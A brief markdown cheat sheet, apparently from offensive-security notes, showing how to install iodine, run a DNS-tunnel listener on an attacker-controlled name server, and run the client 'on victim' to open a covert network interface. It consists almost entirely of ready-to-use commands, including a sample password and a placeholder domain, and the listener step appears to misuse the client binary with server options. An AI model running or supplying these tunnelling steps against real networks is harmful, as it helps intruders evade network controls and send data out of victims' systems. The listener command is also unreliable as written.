# Install Iodine
```bash
apt install iodine
```

# Run Iodine daemon to listen for connections
```bash
iodine -u nobody -P 'tr98xgh!h7d' -f 10.0.0.1 ns1.<Domain Name>.com
```

# Run Iodine client on victim
```bash
iodine -P 'tr98xgh!h7d' ns1.<Domain Name>.com -T CNAME -r -f
# If successful, will create a new, network interface, with an IP incremented from the one assigned to the daemon (10.0.0.2).
```

# References
##### [Iodine](https://code.kryo.se/iodine/)
##### [Github](https://github.com/yarrick/iodine)